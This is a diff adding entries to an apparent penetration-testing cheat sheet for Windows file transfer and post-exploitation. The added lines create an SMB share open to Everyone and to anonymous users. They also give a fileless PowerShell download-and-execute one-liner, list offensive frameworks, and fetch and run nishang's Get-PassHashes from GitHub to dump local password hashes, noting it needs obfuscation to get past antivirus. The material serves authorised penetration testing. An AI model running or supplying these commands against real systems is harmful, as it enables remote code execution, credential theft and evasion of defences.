@@ -37,6 +37,34 @@ Windows
 	Powershell
 		PowerShell -c "(new-object System.Net.WebClient).DownloadFile('<source URL>', '<destination file path>')"
 
+
+		Create a guest SMB shared drive
+		new-item "c:\users\public\share" -itemtype directory
+		New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
+
+			To stop it afterwards, execute:
+			Remove-SmbShare -Name "sharedir" -Force
+
+		File-less download and execute
+			iex(iwr("https://URL"))
+			iwr = Invoke-WebRequest
+			iex = Invoke-Expression
+
+			The remote content will be downloaded and loaded without touching the disk
+			https://github.com/samratashok/nishang
+			https://github.com/PowerShellMafia/PowerSploit
+			https://github.com/FuzzySecurity/PowerShell-Suite
+			https://github.com/EmpireProject/Empire (modules here)
+
+			e.g. dumping local password hashes (hashdump) using nishang Get-PassHashes module:
+
+			iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
+			***likely flagged by any decent AV or EDR - needs obfuscation***
+
+
+
+
+
 	xcopy between machines on a domain
 		xcopy \\<remote_PC>\c$\temp\<filename> c:\temp\<directory_name>
 
